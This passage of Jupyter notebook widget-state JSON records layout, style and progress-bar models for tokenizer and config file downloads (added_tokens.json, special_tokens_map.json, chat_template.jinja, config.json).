            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "eae8c40081534c398b11083477a75fd4": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "460bf46c905946f39f87fcd6c5522e7a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_7bcbe4f4de784d35b5aef35fd9db61a0",
              "IPY_MODEL_647da9486c7b49789ebfd0b70c853a1e",
              "IPY_MODEL_c1869066f1d24a8f90b30e2ce390f89e"
            ],
            "layout": "IPY_MODEL_c3fc0f17320b4aa9ad299b8694673f9e"
          }
        },
        "7bcbe4f4de784d35b5aef35fd9db61a0": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_42bb1a2e1924436f857a52ef55c07a18",
            "placeholder": "​",
            "style": "IPY_MODEL_803a321d794449d9a525293a0287af2d",
            "value": "added_tokens.json: 100%"
          }
        },
        "647da9486c7b49789ebfd0b70c853a1e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_cab33848e1074f839ed75ac17833c030",
            "max": 707,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_0be97aaedace47e186178827f54df105",
            "value": 707
          }
        },
        "c1869066f1d24a8f90b30e2ce390f89e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_3cf7d60104ba48c1a53dd16f946f5c59",
            "placeholder": "​",
            "style": "IPY_MODEL_30960741a75447458f2172bc1bf3b081",
            "value": " 707/707 [00:00&lt;00:00, 87.7kB/s]"
          }
        },
        "c3fc0f17320b4aa9ad299b8694673f9e": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "42bb1a2e1924436f857a52ef55c07a18": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "803a321d794449d9a525293a0287af2d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "cab33848e1074f839ed75ac17833c030": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0be97aaedace47e186178827f54df105": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "3cf7d60104ba48c1a53dd16f946f5c59": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "30960741a75447458f2172bc1bf3b081": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "0ea81c6c471347a58debc76aca796e62": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_3110993765d64fadb01846156a260429",
              "IPY_MODEL_b6bfbc670c08494a92e88e2c6e890216",
              "IPY_MODEL_c5ce2b3be5184952b17f212d984a29fb"
            ],
            "layout": "IPY_MODEL_d08028740f01497a869ed62b5afbb9d6"
          }
        },
        "3110993765d64fadb01846156a260429": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_36b1a32b58e64250898bff2f39b7d374",
            "placeholder": "​",
            "style": "IPY_MODEL_836f4c792f8e4b5897f24ebf6ad1ef85",
            "value": "special_tokens_map.json: 100%"
          }
        },
        "b6bfbc670c08494a92e88e2c6e890216": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_215cbea377704480b70a88bb082ebb10",
            "max": 614,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_7a6adaa9b81049dc9defaca8d797bc72",
            "value": 614
          }
        },
        "c5ce2b3be5184952b17f212d984a29fb": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_82475761054e4872b739a2b953e64298",
            "placeholder": "​",
            "style": "IPY_MODEL_60cd281ab1f345c2b8023de5adb47c89",
            "value": " 614/614 [00:00&lt;00:00, 80.2kB/s]"
          }
        },
        "d08028740f01497a869ed62b5afbb9d6": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "36b1a32b58e64250898bff2f39b7d374": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "836f4c792f8e4b5897f24ebf6ad1ef85": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "215cbea377704480b70a88bb082ebb10": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "7a6adaa9b81049dc9defaca8d797bc72": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "82475761054e4872b739a2b953e64298": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "60cd281ab1f345c2b8023de5adb47c89": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "ca944cb33e5845a2b793b676bfde5c77": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_7e51359838c34393a77771a13035be83",
              "IPY_MODEL_464e492ab874427f83eb8c572e7fe6de",
              "IPY_MODEL_4059d0e2276142feab51494d3cecebf1"
            ],
            "layout": "IPY_MODEL_2086aae2292c4a74ad4738dc096bd478"
          }
        },
        "7e51359838c34393a77771a13035be83": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_30f101c6a8b84a06a2f041a8b04601c9",
            "placeholder": "​",
            "style": "IPY_MODEL_08c4c18fa0114519afdc57ce7d0fb55c",
            "value": "chat_template.jinja: "
          }
        },
        "464e492ab874427f83eb8c572e7fe6de": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_ab7c71bb937f43f4aac2937ac662c701",
            "max": 1,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_6e020992eecf4992a3d09996351f72e7",
            "value": 1
          }
        },
        "4059d0e2276142feab51494d3cecebf1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_00bb7f6935924442b28f4615fe6b06a2",
            "placeholder": "​",
            "style": "IPY_MODEL_c260d30cecd54b5ab09d73a62691b797",
            "value": " 4.76k/? [00:00&lt;00:00, 490kB/s]"
          }
        },
        "2086aae2292c4a74ad4738dc096bd478": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "30f101c6a8b84a06a2f041a8b04601c9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "08c4c18fa0114519afdc57ce7d0fb55c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "ab7c71bb937f43f4aac2937ac662c701": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": "20px"
          }
        },
        "6e020992eecf4992a3d09996351f72e7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "00bb7f6935924442b28f4615fe6b06a2": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "c260d30cecd54b5ab09d73a62691b797": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "676aaa0b8227482cb0d7ccbe341e67e6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_a85d70ed58424986a3210994754810bf",
              "IPY_MODEL_52186c5352864b3788f007e47ed3f52b",
              "IPY_MODEL_af75f8d7fbfb47dc9c02e3bcaacced56"
            ],
            "layout": "IPY_MODEL_9217447508564f11afe2efefa257165b"
          }
        },
        "a85d70ed58424986a3210994754810bf": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_2f95561ae8ae463dbb96dd06c54617b9",
            "placeholder": "​",
            "style": "IPY_MODEL_12fa676fc3ef43a79fc8dea37326d17a",
            "value": "config.json: 100%"
          }
        },
        "52186c5352864b3788f007e47ed3f52b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_5d823dda82354ba8aa58cc59c4768dc8",
            "max": 754,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_5381a8da72b94bb2a1523525805ce8bc",
            "value": 754
          }
        },
        "af75f8d7fbfb47dc9c02e3bcaacced56": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_4c0920207d3d42f4a8fd8e1fe3e50f13",
            "placeholder": "​",
            "style": "IPY_MODEL_5d06c490324e4412a98a35ef0f59e6ca",
